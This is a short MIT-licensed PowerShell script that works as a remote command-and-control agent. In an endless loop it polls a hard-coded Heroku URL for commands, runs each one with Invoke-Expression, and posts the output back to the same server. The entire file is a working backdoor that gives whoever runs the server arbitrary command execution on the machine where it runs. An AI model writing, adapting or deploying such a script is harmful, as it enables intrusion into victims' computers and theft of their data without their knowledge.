# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

$__url = "https://unorubberserver.herokuapp.com/"

while (1 -eq 1)
{
	$__cmd = ""
	
	try
	{
		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "get_cmd")).Content
	}
	catch
	{
		Sleep 1
		continue
	}
	
	if ($__cmd -eq "")
	{
		Sleep 3
		continue
	}
	
	$__result = ""
	
	try
	{
		$__result = (iex $__cmd 2>&1 | Out-String)
	}
	catch
	{
		Write-Error $_
	}

	$__output = $__result + ($error[0] | Out-String)
	$error.clear()
	
	$__params = @{output = $__output}
	Invoke-WebRequest -UseBasicParsing -Uri ($__url + "update_output/") -Method POST -Body $__params
}
